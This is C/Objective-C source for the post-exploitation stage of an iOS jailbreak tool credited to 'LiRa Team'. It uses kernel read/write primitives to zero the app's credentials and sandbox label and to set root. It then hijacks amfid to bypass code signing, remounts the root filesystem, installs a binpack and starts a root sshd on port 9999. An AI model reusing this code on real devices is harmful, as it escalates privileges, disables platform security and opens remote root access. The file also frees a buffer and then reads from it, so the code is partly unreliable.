//
//  post_exploit.c
//  ios-fuzzer
//
//  Created by Quote on 2021/1/28.
//  Copyright © 2021 Quote. All rights reserved.
//

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <copyfile.h>
#include <spawn.h>
#include <Foundation/Foundation.h>
#include "../mylib/mycommon.h"
#include "../mylib/utils.h"
#include "../mylib/k_utils.h"
#include "../mylib/kapi.h"
#include "../mylib/k_offsets.h"
#include "../mylib/remount.h"
#include "../mylib/amfi.h"

#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);
#define JAILB_ROOT "/private/var/containers/Bundle/jb_resources/"
#define in_bundle(obj) strdup([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@obj] UTF8String])
static const char *jailb_root = JAILB_ROOT;

char *Build_resource_path(char *filename);
void patch_amfid(pid_t amfid_pid);
#include <ifaddrs.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <copyfile.h>
#include <dirent.h>


#define PROC_ALL_PIDS        1
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);

pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, const char *want))
{
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000) {
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    int len;
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if (pids[i] == 0) {
            continue;
        }
        memset(pathBuffer, 0, sizeof(pathBuffer));
        len = proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
        if (len == 0) {
            continue;
        }
        if (match(pathBuffer, name)) {
            free(pids);
            return pids[i];
        }
    }
    free(pids);
    return 0;
}

pid_t look_for_proc(const char *proc_name)
{
    return look_for_proc_internal(proc_name, ^bool (const char *path, const char *want) {
        if (!strcmp(path, want)) {
            return true;
        }
        return false;
    });
}

pid_t look_for_proc_basename(const char *base_name)
{
    return look_for_proc_internal(base_name, ^bool (const char *path, const char *want) {
        const char *base = path;
        const char *last = strrchr(path, '/');
        if (last) {
            base = last + 1;
        }
        if (!strcmp(base, want)) {
            return true;
        }
        return false;
    });
}

void patch_TF_PLATFORM(kptr_t task)
{
    uint32_t t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("old t_flags %#x", t_flags);

    t_flags |= 0x00000400; // TF_PLATFORM
    kapi_write32(task + OFFSET(task, t_flags), t_flags);
    t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("new t_flags %#x", t_flags);

    // used in kernel func: csproc_get_platform_binary
}

struct proc_cred {
    char posix_cred[0x100]; // HACK big enough
    kptr_t cr_label;
    kptr_t sandbox_slot;
};

void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred)
{
    *old_cred = NULL;
    kptr_t p_ucred = kapi_read_kptr(proc + OFFSET(proc, p_ucred));
    kptr_t cr_posix = p_ucred + OFFSET(ucred, cr_posix);

    size_t cred_size = SIZE(posix_cred);
    char zero_cred[cred_size];
    struct proc_cred *cred_label;
    fail_if(cred_size > sizeof(cred_label->posix_cred), "struct proc_cred should be bigger");
    cred_label = malloc(sizeof(*cred_label));

    kapi_read(cr_posix, cred_label->posix_cred, cred_size);
    cred_label->cr_label = kapi_read64(cr_posix + SIZE(posix_cred));
    cred_label->sandbox_slot = 0;

    if (cred_label->cr_label) {
        kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000; // untag, 25 bits
        cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
        kapi_write64(cr_label + 0x10, 0x0);
    }

    memset(zero_cred, 0, cred_size);
    kapi_write(cr_posix, zero_cred, cred_size);
    *old_cred = cred_label;
}

void proc_restore_cred(kptr_t proc, struct proc_cred *old_cred)
{
    // TODO
}

void display_ip_address(){
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    if(getifaddrs(&interfaces) == 0){
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                
                util_info("    %s: ", temp_addr->ifa_name);
                char *ip_addr = inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr);
                util_info("    %s", ip_addr);
            }
            temp_addr = temp_addr->ifa_next;
        }
        freeifaddrs(interfaces);
    }else{
        util_error("Error: getifaddrs");
    }
}
void check_file_type_and_give_em_permission(char *file_path){
    uint32_t HeaderMagic32 = 0xFEEDFACE; // MH_MAGIC
    uint32_t HeaderMagic32Swapped = 0xCEFAEDFE; // MH_CIGAM
    uint32_t HeaderMagic64 = 0xFEEDFACF; // MH_MAGIC_64
    uint32_t HeaderMagic64Swapped = 0xCFFAEDFE; // MH_CIGAM_64
    uint32_t UniversalMagic = 0xCAFEBABE; // FAT_MAGIC
    uint32_t UniversalMagicSwapped = 0xBEBAFECA; // FAT_CIGAM
    
    struct stat fstat = {0};
    if(stat(file_path, &fstat)){
        return;
    }
    if(fstat.st_size < (20))
        return;
    
    int fd = open(file_path, O_RDONLY);
    if(fd){
        uint32_t *file_head4bytes = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, 0);
        if((int)(file_head4bytes) == -1){
            close(fd);
            return;
        }
        if((*file_head4bytes == HeaderMagic32) ||
           (*file_head4bytes == HeaderMagic32Swapped) ||
           (*file_head4bytes == HeaderMagic64) ||
           (*file_head4bytes == HeaderMagic64Swapped) ||
           (*file_head4bytes == UniversalMagic) ||
           (*file_head4bytes == UniversalMagicSwapped) ||
           !strncmp((char*)file_head4bytes, "#!", 2)
           ){
            chown(file_path, 0, 0);
            chmod(file_path, 0755);
        }
        munmap(file_head4bytes, PAGE_SIZE);
        close(fd);
    }
}

void alter_exec_perm_in_dir(const char *name, int i_deep){
    DIR *dir;
    struct dirent *entry;
    
    if (!(dir = opendir(name))){
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char path[1024];
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            if(entry->d_name[0] == '.')
                continue;
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            
            alter_exec_perm_in_dir(path, i_deep+1);
        } else {
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            
            check_file_type_and_give_em_permission(path);
        }
    }
    closedir(dir);
}
#pragma mark ---- Post-exp main entry ----

void post_exploit(void)
{
    // can not do this under PAC
    //kapi_write64(g_exp.self_proc + OFFSET(proc, p_ucred), kernelCredAddr);
    struct proc_cred *old_cred;
    proc_set_root_cred(g_exp.self_proc, &old_cred);
    util_msleep(100);

    int err = setuid(0);
    if (err) {
        perror("setuid");
    }

    // Test writing to the outer worlds
    util_info("---- Sandbox ----");
    if (1) { // ok
        FILE *fp = fopen("/var/mobile/.LiRa", "wb");
        fail_if(fp == NULL, "không viết được /var/mobile/.LiRa");
        util_info("đã viết tệp thử nghiệm: %p", fp);
        fprintf(fp, "LiRam Team jailbreak\n");
        fclose(fp);
    }
    util_info("Đã thoát khỏi Sandbox");
    util_info("---- Xong ----\n");
    //patch_TF_PLATFORM(g_exp.self_task);

    // ----------------------------------------------------------------------
    
    //  Stage 1. Make executable
    util_info("---- AMFID ----");
    platformize(getpid());
    grabEntitlements(kproc_find_by_pid(getpid()));
    takeoverAmfid(pid_by_name("amfid"));
        const char *amfid_bypassd_path = "/private/var/containers/Bundle/jb_resources/amfid_bypassd";
        if(look_for_proc(amfid_bypassd_path)){
            util_info("amfid_bypassd already running\n");
            return;
        }
        remove(amfid_bypassd_path);unlink(amfid_bypassd_path);
        if(access(amfid_bypassd_path, F_OK)){
            mkdir("/private/var/containers/Bundle/jb_resources", 0777);
            copyfile(Build_resource_path("/jb_resources/amfid_bypassd"), amfid_bypassd_path);
            chown(amfid_bypassd_path, 0, 0);
            chmod(amfid_bypassd_path, 0755);
        }
        pid_t amfid_bypassd_pid = 0;
        if(fork() == 0){
            daemon(1, 1);
            close(STDIN_FILENO);
            close(STDOUT_FILENO);
            close(STDERR_FILENO);
            const char *argv[] = {amfid_bypassd_path, NULL};
            execvp(argv[0], (char*const*)argv);
            exit(1);
        }
    util_info("---- Xong ----\n");
    
    //  bootstrap rootfs
    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:in_bundle("rootfs")] toPath:@"/tmp/rootfs" error:nil];
    chmod("/tmp/rootfs", 0755);
    //  Stage 2. Remount RootFS
    util_info("---- Remount/RootFS ----");
    if(!remount(kproc_find_by_pid(1)))
    {
        util_error("Failed to remount rootfs!");
        goto err;
    }

    FILE *f = fopen("/.remount_success", "w");
    fprintf(f,"Công cụ thuộc LiRa Team\n");
    fclose(f);

    if(access("/.remount_success", F_OK) == -1) {
        util_info("Không thể ghi tệp trên rootfs.");
        goto err;
    }
    util_info("Ghi thành công tệp trên rootfs.");
    unlink("/.remount_success");

    /*  Stage 2-2. Restore RootFS
    if(!restore_rootfs())
    {
        util_error("Failed to restore rootfs!\n");
        goto err;
    }    */
    util_info("---- Xong ----\n");
    //Stage 3 bootstrap
    util_info("---- Đang cài đặt Bootstrap ----");
    copyfile(Build_resource_path("/jb_resources/binpack64/bin"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/bin", 0); util_info("(1/5)...");
    copyfile(Build_resource_path("/jb_resources/binpack64/etc"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/etc", 0); util_info("(2/5)...");
    copyfile(Build_resource_path("/jb_resources/binpack64/sbin"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/sbin", 0);
    util_info("(3/5)...");
    copyfile(Build_resource_path("/jb_resources/binpack64/usr"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/usr", 0); util_info("(4/5)...");
    copyfile(Build_resource_path("/jb_resources/binpack64/var"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/var", 0); util_info("(5/5)...");
    copyfile(Build_resource_path("/jb_resources/fix_14_0.sh"), "/private/var/containers/Bundle/jb_resources/");
    copyfile(Build_resource_path("/jb_resources/share_analytics.sh"), "/private/var/containers/Bundle/jb_resources/");
    
    chown("/private/var/containers/Bundle/jb_resources/share_analytics.sh", 0, 0);
    chmod("/private/var/containers/Bundle/jb_resources/share_analytics.sh", 0755);
    
    // Bật SSH và set port
    setenv("DYLD_LIBRARY_PATH", "/private/var/containers/Bundle/jb_resources/usr/lib", 1);
    setenv("PATH2", "/private/var/containers/Bundle/jb_resources/bin:/private/var/containers/Bundle/jb_resources/sbin:/private/var/containers/Bundle/jb_resources/usr/bin:/private/var/containers/Bundle/jb_resources/usr/sbin", 1);
    chdir("/private/var/containers/Bundle/jb_resources");
    
    util_runCommand("/private/var/containers/Bundle/jb_resources/bin/bash", "-c", "/private/var/containers/Bundle/jb_resources/usr/bin/nohup /private/var/containers/Bundle/jb_resources/usr/sbin/sshd -D -p 9999 -f \"/private/var/containers/Bundle/jb_resources/etc/ssh/sshd_config\" >/dev/null 2>&1 &", NULL);
    chmod("/private/var/containers/Bundle/jb_resources/usr/bash", 0755);
    chmod("/private/var/containers/Bundle/jb_resources/usr/bin/sw_vers", 0755);
    chmod("/private/var/containers/Bundle/jb_resources/usr/bin/uname", 0755);
    util_info("---- Xong ----\n");
    util_info("---- Cổng/iP ----");
    util_info("Cổng: 9999");
        display_ip_address();
    util_info("---- Xong ----\n");
    
    util_info("---- Jailbreak thành công:) ----");
    
    // ----------------------------------------------------------------------

err:
    proc_restore_cred(g_exp.self_proc, old_cred);
    free(old_cred);
}
